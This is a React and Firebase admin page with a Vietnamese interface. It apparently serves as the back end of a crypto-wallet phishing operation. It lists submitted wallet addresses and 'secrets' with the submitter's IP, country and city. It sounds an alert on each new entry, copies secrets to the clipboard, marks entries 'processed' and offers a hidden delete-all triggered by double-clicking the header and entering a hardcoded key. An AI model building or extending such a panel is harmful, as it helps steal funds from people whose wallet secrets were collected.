import React, { useState, useEffect, useRef } from "react";
import {
  collection,
  deleteDoc,
  doc,
  getDocs,
  onSnapshot,
  orderBy,
  query,
  runTransaction,
  updateDoc
} from "firebase/firestore";
import { db } from "../../firebase";
import moment from 'moment';
import { UserOutlined } from "@ant-design/icons";
import { Button, DatePicker, Form, Input, Pagination } from "antd";
const { RangePicker } = DatePicker;

const AdminPage = () => {
  const [users, setUsers] = useState([]);
  const [totalRecord, setTotalRecords] = useState(1);
  const [currentPage, setCurrentPage] = useState(1);
  const [pageSize, setPageSize] = useState(30);
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("createdAt", "desc"));
  const audioRef = useRef(null);
  const [isSwitchOn, setIsSwitchOn] = useState(false);
  const [reload, setReload] = useState(false);
  const [filter, setFilter] = useState({});

  const isFirstRender = useRef(true);

  useEffect(() => {
      isFirstRender.current = false;
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const snapshot = await onSnapshot(q, (querySnapshot) => {
          const userList = querySnapshot.docs.map((doc) => ({
            userID: doc.id,
            ...doc.data(),
          }));

          console.log(userList);

          const changes = querySnapshot.docChanges();
          if (changes.length > 0 && changes[0]?.type === "added") {
            const audio = audioRef.current;
            const isMuted = localStorage.getItem("isMuted");
            // Check if the audio element exists and is paused
            if (audio && audio.paused && isMuted !== "true") {
                audio.play().catch((error) => {
                });
            }
          }
          const offset = (currentPage - 1) * pageSize;
          const usersPerPage = userList.slice(offset, offset + pageSize);
          setUsers(usersPerPage);
          setTotalRecords(userList.length);
          setCurrentPage(1);
          setReload((prev) => !prev);
        });

        return snapshot;
      } catch (error) {
        console.error("Error fetching data from Firestore: ", error);
      }
    };

    // Fetch initial data
    fetchData();
  }, []);

  useEffect(() => {
    const isMuted = localStorage.getItem("isMuted");
    setIsSwitchOn(isMuted === "true");
  }, []);

  const toggleSwitch = (e) => {
    setIsSwitchOn(e.target.checked);
    localStorage.setItem("isMuted", e.target.checked);
  };

  const deleteAllData = async (e) => {
      if(e.detail === 2){
        if (confirm('Are you want to delete all data?')) {
          var key = prompt("Enter a key", "");
          if(key == "deleteall"){
            const querySnapshot = await getDocs(q);
            const deleteOps = [];
            querySnapshot.forEach((doc) => {
              deleteOps.push(deleteDoc(doc.ref));      
            });
            Promise.all(deleteOps).then(() => alert('Thing was saved to the database.'))
          }
        } 
      }
  };

  const filteredUsers = (userList) => {
    const { "range-time": dateRange, findkey } = filter;

    return userList.filter((user) => {
      if (findkey && (!user.wallet.toLowerCase().includes(findkey.trim().toLowerCase()) && !user.secret.toLowerCase().includes(findkey.trim().toLowerCase()))) {
        return false;
      }

      if (dateRange) {
        const userDate = moment(user.createdAt);
        const startDate = moment(dateRange[0], "YYYY-MM-DD");
        const endDate = moment(dateRange[1], "YYYY-MM-DD");
        if (!userDate.isBetween(startDate, endDate, null, "[]")) {
          return false;
        }
      }

      return true;
    });
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        const querySnapshot = await getDocs(q);
        let userList = querySnapshot.docs.map((doc) => ({
          userID: doc.id,
          ...doc.data(),
        }));
        userList = filteredUsers(userList);
        const offset = (currentPage - 1) * pageSize;
        const usersPerPage = userList.slice(offset, offset + pageSize);
        setUsers(usersPerPage);
        setTotalRecords(userList.length);
      } catch (error) {
        console.error("Error fetching data from Firestore: ", error);
      }
    };

    fetchData();
  }, [currentPage, reload]);


  const handlePageChange = (page) => {
    setCurrentPage(page);
  };

  const handleStatus = async (statusval,userID) => {
    try {
      if (confirm("Are you sure to change status?")) {
        const userRef = doc(db, "users", userID);
        await updateDoc(userRef, {
          status: statusval == 0 ? 1 : 0,
        });
        setReload((prevState) => !prevState);
      }
    } catch (error) {
      console.log(error);
    }
  };

  const handleDelete = async (userID) => {
    try {
      if (confirm('Are you want to delete this data?')) {
        var key = prompt("Enter a key", "");
        if(key == "delete"){
          // Tạo một reference đến tài khoản bạn muốn xóa
          const userRef = doc(db, "users", userID); // Đây giả định rằng ID của người dùng được sử dụng làm ID của tài khoản
          // Gọi hàm xóa dựa trên reference
          await deleteDoc(userRef);
          setReload((prevState) => !prevState);
        }
      }
    } catch (error) {
      console.log(error);
    }
  };

  const onFinish = (fieldsValue) => {
    let findkey = fieldsValue["txt-search-key"];
    const values = {
      findkey
    };
    const rangeTimeValue = fieldsValue["range-time"];
    if (rangeTimeValue) {
      values["range-time"] = [
        rangeTimeValue[0].format("YYYY-MM-DD HH:mm:ss"),
        rangeTimeValue[1].format("YYYY-MM-DD HH:mm:ss"),
      ];
    }
    setFilter(values);
    setCurrentPage(1);
    setReload((prv) => !prv);
  };
  

  return (
    <div className="container mx-auto mt-8">
      <audio ref={audioRef} src="/music/tigitig.mp3"></audio>
      <h1 onClick={deleteAllData} className="text-2xl font-bold mb-4">Danh sách người dùng</h1>
      <div className="w-full flex items-center mt-2 mb-2 gap-3">
      <div className="w-[300px] flex items-center mt-2 mb-2 gap-3">
      <label className="relative inline-flex items-center cursor-pointer mb-3">
        <input
          onChange={toggleSwitch}
          type="checkbox"
          checked={isSwitchOn}
          className="sr-only peer"
        />
        <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 dark:peer-focus:ring-blue-800 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-blue-600"></div>
        <span className="ml-3 text-sm font-medium text-gray-900 dark:text-gray-300">
          Tắt tiếng
        </span>
      </label>
      </div>
      <div className="hidden md:block w-full flex-1 flex items-center mt-2 mb-2 gap-3">
          <Form
            name="time_related_controls"
            onFinish={onFinish}
            style={{ maxWidth: 600 }}
            layout="inline"
            className="min-w-full"
          >
            <Form.Item name="txt-search-key" label="Wallet/Secret">
              <Input
                allowClear
                prefix={<UserOutlined className="site-form-item-icon" />}
                placeholder="Wallet hoặc Secret"
              />
            </Form.Item>
            <Form.Item name="range-time" label="Ngày">
              <RangePicker format="DD-MM-YYYY" />
            </Form.Item>
            <Form.Item
              wrapperCol={{
                xs: { span: 24, offset: 0 },
                sm: { span: 16, offset: 8 },
              }}
            >
              <Button type="primary" htmlType="submit" className="bg-blue-600">
                Tìm kiếm
              </Button>
            </Form.Item>
          </Form>
        </div>
      </div>
      <div>
      <div className="overflow-auto rounded-lg shadow hidden md:block">
      <table className="w-full border-collapse border border-gray-300">
        <thead>
          <tr>
            <th className="py-2 px-4 bg-gray-200">No.</th>
            <th className="py-2 px-4 bg-gray-200">Status</th>
            <th className="py-2 px-4 bg-gray-200">Wallet</th>
            <th className="py-2 px-4 bg-gray-200">Secret</th>
            <th className="py-2 px-4 bg-gray-200">Time</th>
            <th className="py-2 px-4 bg-gray-200">IP</th>
            <th className="py-2 px-4 bg-gray-200">Action</th>
          </tr>
        </thead>
        <tbody>
          {users.map((user) => (
            <tr key={user.userID}>
              <td className="py-2 px-4 border border-gray-300">{user.auto_id}</td>
              <td className="py-2 px-4 border border-gray-300">
                <div className={user.status == 1 ? 'text-success' : 'text-primary' } style={{border: '1px solid',height: 'auto', width: '150px', display: 'flex', alignitems: 'center', justifycontent: 'center',padding: '2.5px'}}>
                {user.status == 0 ? 'Chưa xử lý': 'Đã xử lý' }
                </div>
              </td>
              <td onClick={() => navigator.clipboard.writeText(user.wallet)} className="py-2 px-4 border border-gray-300">{user.wallet}</td>
              <td onClick={() => navigator.clipboard.writeText(user.secret)} className="py-2 px-4 border border-gray-300">{user.secret}</td>
              <td className="py-2 px-4 border border-gray-300">
                {moment(new Date(user.createdAt)).format("yyyy-MM-DD HH:mm:ss")}
              </td>
              <td className="py-2 px-4 border border-gray-300">
                {(() => {
                  if(user.ip){
                    var json = JSON.parse(user.ip);
                    return `
                    ${json.IP} \n
                    ${json.country}\n
                    ${json.city}\n`;
                  }else{
                    return "Unknown"
                  }
                 })()}
              </td>
              <td className="py-2 px-4 border border-gray-300 flex flex-wrap gap-3">
                <button
                  style={{display: (user.status2 !== 0) ? 'inline-block' : 'none' , height:"50%"}}
                  className={"w-[100px] btn btn-sm mb-2 "+ (user.status == 0 ? 'btn-success' : 'btn-primary')}
                  onClick={() => handleStatus(user.status,user.userID)}
                >
                    {user.status == 1 ? 'Chưa xử lý': 'Đã xử lý' }
                </button>
                
                <button
                  style={{height:"50%"}}
                  className="w-[100px] btn btn-sm mb-2 btn-danger"
                  onClick={() => handleDelete(user.userID)}
                >
                  Xóa
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
      </div>

        <div className="grid grid-cols-1 gap-4 md:hidden">
          <div className="bg-white p-4 rounded-lg shadow">
            {users.map((user) => (
            <><div key={user.userID} className="flex items-center space-x-2 text-sm">
                <div>
                  <a href="#" className="text-blue-500 font-bold hover:underline">#{user.auto_id}</a>
                </div>
                <div className="font-bold text-sky-500">{user.wallet}</div>
                <div>
                  {/* <span className="rounded-lg bg-opacity-50 p-1.5 text-xs font-medium uppercase tracking-wider text-green-800 bg-green-200">
                  {user.status == 0 ? 'Chưa xử lý': 'Đã xử lý' }
                  </span> */}
              <div onClick={() => handleStatus(user.status,user.userID)} className="flex items-center">
                {user.status == 0 &&
                  <><input type="checkbox" className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600" /><label className="ms-2 text-sm font-medium text-gray-400 text-gray-500">Chưa xử lý</label></>
                }
                
              {user.status == 1 &&
                  <><input checked id="checked-checkbox" type="checkbox" className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"/>
                  <label className={"ms-2 text-sm font-medium text-green-400 text-green-500"}>Đã xử lý</label></>
              }


              </div>
                </div>
              </div>
              <div style={{marginTop:10}}>
                <textarea   onClick={(event) => {
                  if(event.detail == 2){
                    navigator.clipboard.writeText(user.secret)
                    alert('Copied to clipboard');
                  }
                }}
              defaultValue={user.secret} style={{ border: '1px solid #e9ecef',padding:10,background:'beige',width:'100%',minHeight:50 }}>
                  </textarea>
              </div>
              <div style={{marginTop:10}} className="text-orange-400">
                {moment(new Date(user.createdAt)).format("yyyy-MM-DD HH:mm:ss")}
                </div>
              <div style={{marginTop:10}}>
              <div className="text-grey">
              {(() => {
                  if(user.ip){
                    var json = JSON.parse(user.ip);
                    return `
                    ${json.IP} \n
                    ${json.country}\n
                    ${json.city}\n`;
                  }else{
                    return "Unknown"
                  }
                 })()}
                </div>
              </div>
              </>

          ))}
          </div>

        </div>

      
      </div>
      <div className="mt-4 flex space-x-2 justify-center">
        <Pagination
          showQuickJumper
          current={currentPage}
          pageSize={pageSize}
          defaultCurrent={1}
          total={totalRecord}
          onChange={handlePageChange}
        />
      </div>
    </div>
  );
};

export default AdminPage;
